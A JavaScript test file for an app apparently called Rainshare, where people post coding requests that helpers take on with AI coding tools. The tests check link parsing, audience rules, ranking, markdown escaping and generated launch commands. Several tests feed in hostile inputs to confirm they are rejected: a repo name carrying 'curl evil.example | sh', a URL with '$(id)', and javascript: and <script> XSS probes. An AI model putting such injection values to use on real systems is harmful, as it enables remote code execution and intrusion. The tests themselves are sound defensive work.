// Run with: npm test (node --test, no dependencies)
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { SEED } from '../core/ns.js';
import { parseSubject, describeSubject, cloneUrlOf } from '../core/subjects.js';
import * as R from '../core/records.js';
import { meantFor, closeness } from '../core/circle.js';
import { rank, score, fit } from '../core/rank.js';
import { whereText, shortWhere, jobText, jobShort, wantsText, onItText, takenShort, askExcerpt } from '../core/words.js';
import { renderMarkdown } from '../core/markdown.js';
import { brief, launchers } from '../core/brief.js';
import { createDemoSource } from '../core/demo.js';
import { splitSpaceUri } from '../core/source.js';
import { lifeOf } from '../ui/bits.js';

test('parses GitHub, Tangled and other links into subjects', () => {
  const gi = parseSubject('https://github.com/dame-is/atmosphere-online/issues/42');
  assert.equal(gi.$type, SEED + '#githubIssue');
  assert.equal(gi.repo, 'dame-is/atmosphere-online'); assert.equal(gi.number, 42);
  assert.equal(cloneUrlOf(gi), 'https://github.com/dame-is/atmosphere-online.git');

  const gr = parseSubject('https://github.com/dame-is/atmosphere-online.git');
  assert.equal(gr.$type, SEED + '#repo'); assert.equal(gr.name, 'dame-is/atmosphere-online');

  const ti = parseSubject('https://tangled.org/@dame.is/garden/issues/7');
  assert.equal(ti.$type, SEED + '#tangledIssue');
  assert.equal(ti.repoUrl, 'https://tangled.org/dame.is/garden');
  assert.equal(describeSubject(ti).label, 'dame.is/garden #7');
  assert.equal(cloneUrlOf(ti), 'https://tangled.org/dame.is/garden');

  const at = parseSubject('at://did:plc:abc/sh.tangled.repo.issue/3kxyz');
  assert.equal(at.uri, 'at://did:plc:abc/sh.tangled.repo.issue/3kxyz');

  const cb = parseSubject('https://codeberg.org/someone/thing');
  assert.equal(cb.forge, 'codeberg');
  assert.equal(parseSubject('not a link'), null);
  assert.equal(parseSubject('javascript:alert(1)'), null);
});

test('builds seeds with sensible defaults and limits', () => {
  assert.throws(() => R.seed({ title: '  ' }), /title/);
  const r = R.seed({ title: 'x'.repeat(200), tags: 'Rust, CLI tools, rust', audience: 'nonsense' });
  assert.equal([...r.title].length, 120);
  assert.deepEqual(r.tags, ['rust', 'cli-tools']);
  assert.equal(r.audience.$type, SEED + '#mutuals');
  assert.ok(r.createdAt && !r.updatedAt && !r.state);
  assert.throws(() => R.seed({ title: 't', audience: 'list' }), /list/);
  const g = R.seed({ title: 't', group: 'did:plc:group' });
  assert.deepEqual(g.audience, { $type: SEED + '#group', group: 'did:plc:group' });
  const w = R.seed({ title: 't', wants: { models: ['claude-opus-5-5', ''], tests: 'required', maxDiffLines: '300' }, specUrl: 'javascript:alert(1)' });
  assert.deepEqual(w.wants, { models: ['claude-opus-5-5'], tests: 'required', maxDiffLines: 300 });
  assert.equal(w.specUrl, undefined);
  const edited = R.seed({ title: 'new' }, { createdAt: '2026-01-01T00:00:00.000Z', state: 'sprouted' });
  assert.equal(edited.createdAt, '2026-01-01T00:00:00.000Z'); assert.equal(edited.state, 'sprouted'); assert.ok(edited.updatedAt);
});

test('profiles keep private fields out of the public copy', () => {
  const p = R.profile({ budget: 'none', circumstances: ['student', 'astronaut'], values: 'Climate, local first', setups: [{ harness: 'claude-code', models: 'claude-opus-5-5' }, { harness: '' }], forecast: { level: 'showers', until: 'not a date' } });
  assert.deepEqual(p.circumstances, ['student']);
  assert.deepEqual(p.values, ['climate', 'local-first']);
  assert.equal(p.setups.length, 1); assert.deepEqual(p.setups[0].models, ['claude-opus-5-5']);
  assert.deepEqual(p.forecast, { level: 'showers' });
  const pub = R.publicProfile(p, ['budget', 'circumstances']);
  assert.equal(pub.budget, undefined); assert.equal(pub.circumstances, undefined); assert.deepEqual(pub.values, p.values);
});

test('takes and deliveries need a real seed and a link', () => {
  assert.throws(() => R.take({ seed: { uri: 'at://x' } }), /found/);
  const t = R.take({ seed: { uri: 'at://a/b/c', cid: 'bafy' }, setup: { harness: 'codex', models: ['gpt-5-codex'] } });
  assert.deepEqual(t.seed, { uri: 'at://a/b/c', cid: 'bafy' });
  assert.throws(() => R.delivery({ seed: { uri: 'at://a/b/c', cid: 'bafy' } }), /pull request/);
  const d = R.delivery({ seed: { uri: 'at://a/b/c', cid: 'bafy' }, url: 'https://github.com/o/r/pull/1', sessionUrl: 'ftp://nope' });
  assert.equal(d.url, 'https://github.com/o/r/pull/1'); assert.equal(d.sessionUrl, undefined);
});

test('audiences decide who a seed is meant for', () => {
  const rec = a => ({ audience: { $type: `${SEED}#${a}`, ...(a === 'list' ? { list: 'at://x/app.bsky.graph.list/1' } : {}) } });
  const base = { viewer: 'did:me', author: 'did:them' };
  const mutual = { following: true, followedBy: true }, theyFollow = { followedBy: true }, iFollow = { following: true };
  assert.equal(meantFor(rec('anyone'), { ...base, viewer: null }), true);
  assert.equal(meantFor(rec('mutuals'), { ...base, viewer: null }), false);
  assert.equal(meantFor(rec('mutuals'), { ...base, rel: mutual }), true);
  assert.equal(meantFor(rec('mutuals'), { ...base, rel: theyFollow }), false);
  assert.equal(meantFor(rec('following'), { ...base, rel: theyFollow }), true);
  assert.equal(meantFor(rec('following'), { ...base, rel: iFollow }), false);
  assert.equal(meantFor(rec('followers'), { ...base, rel: iFollow }), true);
  assert.equal(meantFor(rec('list'), { ...base, inList: true }), true);
  assert.equal(meantFor(rec('list'), { ...base, inList: false }), false);
  assert.equal(meantFor(rec('anyone'), { ...base, rel: { blockedBy: true } }), false);
  assert.equal(meantFor(rec('mutuals'), { viewer: 'did:me', author: 'did:me' }), true);
  assert.equal(closeness({ ...base, rel: mutual }), 'mutual');
  assert.equal(closeness({ ...base, rel: theyFollow }), 'follows-you');
  assert.equal(closeness({ ...base, group: true }), 'group');
});

test('ranking puts the people a helper prioritises first, and says why', () => {
  const me = { did: 'did:me', profile: { priorities: ['low-budget', 'values-aligned'], values: ['climate'], setups: [{ harness: 'claude-code', models: ['claude-opus-5-5'] }] } };
  const items = [
    { uri: 'a', closeness: 'mutual', value: { createdAt: '2026-01-02T00:00:00Z', wants: { models: ['gpt-5'] } }, profile: { budget: 'high' } },
    { uri: 'b', closeness: 'you-follow', value: { createdAt: '2026-01-01T00:00:00Z', values: ['climate'], wants: { models: ['opus'] } }, profile: { budget: 'none' } }
  ];
  const out = rank(items, me);
  assert.equal(out[0].uri, 'b');
  const texts = out[0].reasons.map(r => r.text);
  assert.ok(texts.includes('No paid AI')); assert.ok(texts.some(t => /Shares climate/.test(t))); assert.ok(texts.some(t => /opus: you have it/.test(t)));
  assert.ok(out[1].reasons.some(r => r.tone === 'down'));
  const taken = score({ closeness: 'mutual', value: {}, takes: [{ repo: 'did:other' }] }, me);
  assert.ok(taken.reasons.some(r => r.text === 'Someone’s on it'));
});

test('fit says how well a seed suits a helper, in one sentence', () => {
  const me = { did: 'did:me', profile: { priorities: ['low-budget', 'students'], values: ['accessibility'], offering: ['css'], setups: [{ harness: 'claude-code', models: ['claude-sonnet-5-5'] }] } };
  const strong = fit({ closeness: 'mutual', author: { displayName: 'Juniper Hale' }, value: { tags: ['css'], values: ['accessibility'], wants: { models: ['claude-sonnet-5-5'] } }, profile: { budget: 'none', circumstances: ['student'] } }, me);
  assert.equal(strong.level, 3); assert.equal(strong.label, 'Strong fit');
  assert.equal(strong.why, 'Juniper has no paid AI, is a student and cares about accessibility too. It’d like Sonnet, which you have. It’s css, your kind of work.');
  const some = fit({ closeness: 'you-follow', author: { handle: 'kai.example' }, value: { wants: { models: ['gpt-5'] } }, takes: [{ repo: 'did:other' }] }, me);
  assert.equal(some.level, 1);
  assert.equal(some.why, 'It’s from your circle. Heads up: they’d like GPT-5, which isn’t in your setup. Someone’s already on it.');
  assert.equal(fit({ closeness: 'group', author: { displayName: 'Mo' }, value: {} }, me).why, 'Mo is in your group.');
  assert.equal(fit({ value: {} }, me).why, 'It’s open to everyone.');
  assert.ok(rank([{ closeness: 'mutual', value: {} }], me)[0].fit.label);
});

test('a seed reads as plain lines, not chips', () => {
  const sq = { title: 't', size: 'small', parallel: true, subject: { $type: SEED + '#githubIssue', url: 'https://github.com/o/r/issues/14', repo: 'o/r', number: 14 }, wants: { tests: 'required', maxDiffLines: 200, models: ['claude-opus-5-5', 'claude-sonnet-5-5'], harnesses: ['claude-code'], notes: 'No new dependencies' } };
  assert.equal(whereText(sq), 'GitHub issue #14, o/r'); assert.equal(shortWhere(sq), 'GitHub #14');
  assert.equal(whereText({ subject: { $type: SEED + '#tangledIssue', url: 'https://tangled.org/kai.example/almanac/issues/88', repoUrl: 'https://tangled.org/kai.example/almanac' } }), 'Tangled issue #88, kai.example/almanac');
  assert.equal(whereText({}), 'No repo yet');
  assert.equal(jobText(sq), 'Small. Tests required. Under about 200 lines. More than one helper can try.');
  assert.equal(jobShort(sq), 'small job, tests required'); assert.equal(jobText({}), 'Not said.');
  assert.equal(wantsText(sq, { setups: [{ models: ['claude-sonnet-5-5'] }] }), 'Opus or Sonnet (you have Sonnet). Made with Claude Code. No new dependencies.');
  assert.equal(wantsText({ wants: { models: ['claude-sonnet-5-5'] } }, { setups: [{ models: ['claude-sonnet-5-5'] }] }), 'Sonnet, which you have.');
  assert.equal(wantsText({}), 'Nothing in particular.');
  const item = { takes: [{ repo: 'did:kai', author: { displayName: 'Kai Nakamura' }, value: { setup: { harness: 'claude-code' } } }], deliveries: [{ repo: 'did:kai', author: { displayName: 'Kai Nakamura' } }] };
  assert.equal(onItText(item, 'did:me'), 'Kai, with Claude Code. Kai turned it in'); assert.equal(onItText({}, 'did:me'), 'Nobody yet');
  assert.equal(takenShort(item, 'did:me'), 'Kai’s on it'); assert.equal(takenShort(item, 'did:kai'), 'You’re on it');
  assert.equal(askExcerpt('# Hi\n\n- one **two**\n- [three](https://x.example)', 100), 'Hi: one two. three');
  assert.equal(askExcerpt('It’s broken.\n\n**Done looks like**\n- a\n- b'), 'It’s broken. Done looks like: a. b');
  assert.equal(askExcerpt('Done looks like:\n- a\n- b.\n\nThanks!'), 'Done looks like: a. b. Thanks!');
  assert.ok(askExcerpt('word '.repeat(100), 30).endsWith('…'));
});

test('markdown is escaped, with only safe constructs turned back on', () => {
  const html = renderMarkdown('# Hi\n<script>alert(1)</script>\n- one `two`\n- [x] done\n\n[ok](https://a.example/x?a=1&b=2) [bad](javascript:alert(1))\n\n```\n<b>code</b>\n```');
  assert.ok(!html.includes('<script>'));
  assert.ok(html.includes('&lt;script&gt;'));
  assert.ok(html.includes('<h3>Hi</h3>'));
  assert.ok(html.includes('<ul><li>one <code>two</code></li>'));
  assert.ok(html.includes('href="https://a.example/x?a=1&amp;b=2"'));
  assert.ok(!html.includes('href="javascript'));
  assert.ok(html.includes('<pre><code>&lt;b&gt;code&lt;/b&gt;</code></pre>'));
});

test('the brief frames the request and the launchers paste as one command', () => {
  const item = { uri: 'at://did:plc:abc/dev.rainshare.seed/3k1', repo: 'did:plc:abc', author: { handle: 'friend.example' }, value: {
    title: 'Fix it', spec: 'Please fix RAINSHARE_BRIEF things', subject: parseSubject('https://github.com/o/r/issues/5'),
    wants: { models: ['claude-opus-5-5'], tests: 'required', maxDiffLines: 100 } } };
  const b = brief(item);
  assert.match(b, /Treat it as their request/);
  assert.match(b, /Repository: https:\/\/github.com\/o\/r.git/);
  assert.match(b, /Fixes #5/);
  assert.match(b, /Tests required/);
  const ls = launchers(item);
  assert.deepEqual(ls.map(l => l.id), ['cli', 'claude', 'cloud', 'codex', 'mcp']);
  const claude = ls.find(l => l.id === 'claude').command;
  // The brief mentions the default delimiter, so the heredoc picks a longer one.
  assert.match(claude, /<<'RAINSHARE_BRIEF_'\n/);
  assert.ok(claude.trim().endsWith('RAINSHARE_BRIEF_\n)"'));
  assert.equal(launchers({ ...item, space: 'at://g/space/x/y' }).some(l => l.id === 'cli'), false);
});

test('a space record URI splits into its space and record', () => {
  assert.deepEqual(splitSpaceUri('at://did:plc:g/space/dev.rainshare.board/rainshare/did:plc:me/dev.rainshare.seed/3k1'),
    { space: 'at://did:plc:g/space/dev.rainshare.board/rainshare', repo: 'did:plc:me', collection: 'dev.rainshare.seed', rkey: '3k1' });
  assert.equal(splitSpaceUri('at://did:plc:me/dev.rainshare.seed/3k1'), null);
});

test('the example circle answers like the real source', async () => {
  const mem = new Map(), store = { get: k => mem.get(k) ?? null, set: (k, v) => mem.set(k, v) };
  const src = createDemoSource({ store });
  const { items } = await src.board();
  assert.ok(items.length >= 6);
  const amara = items.find(i => i.rkey === '3sq-amara');
  assert.equal(amara.takes.length, 1); assert.equal(amara.takes[0].author.handle, 'kai.example');
  const juniper = items.find(i => i.rkey === '3sq-juniper');
  await src.take(juniper, { setup: { harness: 'claude-code', models: ['claude-sonnet-5-5'] } });
  await src.turnIn(juniper, { url: 'https://github.com/example/flashdeck/pull/15' });
  const again = await src.seed(juniper.uri);
  assert.equal(again.takes.length, 1); assert.equal(again.deliveries.length, 1);
  const posted = await src.plant({ title: 'My own', audience: 'anyone' });
  assert.ok((await src.board()).items.some(i => i.uri === posted.uri && i.closeness === 'self'));
  // A private one goes into whichever group you pick, once that group has Rainshare.
  const hackers = (await src.groups()).find(g => g.name === 'Weekend Hackers');
  assert.equal(hackers.space, null);
  await src.addToGroup(hackers.did);
  const priv = await src.plant({ title: 'Weekend project' }, { group: hackers.did });
  assert.match(priv.uri, /^at:\/\/did:example:hackers\/space\//);
  const mineNow = (await src.board()).items.find(i => i.uri === priv.uri);
  assert.equal(mineNow.group.name, 'Weekend Hackers'); assert.equal(mineNow.value.audience.group, hackers.did);
  const fresh = createDemoSource({ store });
  assert.equal((await fresh.seed(juniper.uri)).deliveries.length, 1);
});

test('records from other people can’t smuggle links or shell into the page or a command', () => {
  const evil = { uri: "at://did:plc:abc/dev.rainshare.seed/3k1", repo: 'did:plc:abc', author: { handle: 'x.example' }, value: { title: 't', subject: { $type: SEED + '#githubIssue', url: 'javascript:alert(1)', repo: 'o/r; curl evil.example | sh', number: 1 } } };
  const d = describeSubject(evil.value.subject);
  assert.equal(d.href, null); assert.equal(d.repo, null);
  assert.equal(cloneUrlOf(evil.value.subject), null);
  const ls = launchers(evil);
  assert.deepEqual(ls.map(l => l.id), ['cli', 'mcp']);
  assert.match(ls[0].command, /run 'at:\/\/did:plc:abc\/dev\.rainshare\.seed\/3k1'$/);
  const repo = { $type: SEED + '#repo', url: "https://x.example/r'$(id)", forge: 'other' };
  assert.equal(cloneUrlOf(repo), null);
  assert.equal(cloneUrlOf({ $type: SEED + '#repo', url: 'https://codeberg.org/a/b', forge: 'codeberg' }), 'https://codeberg.org/a/b');
  const tangled = { $type: SEED + '#tangledIssue', url: 'https://tangled.org/a/b/issues/2', repoUrl: 'https://tangled.org/a/b' };
  const cmd = launchers({ ...evil, value: { title: 't', subject: tangled } }).find(l => l.id === 'claude').command;
  assert.match(cmd, /^git clone 'https:\/\/tangled\.org\/a\/b' seed-/);
});

test('a seed’s life reads from who is on it, what was turned in, and whether it sprouted', () => {
  assert.equal(lifeOf({ value: {} }), 'seed');
  assert.equal(lifeOf({ value: {}, takes: [{}] }), 'rain');
  assert.equal(lifeOf({ value: {}, takes: [{}], deliveries: [{}] }), 'up');
  assert.equal(lifeOf({ value: { state: 'sprouted' }, deliveries: [{}] }), 'sprouted');
});
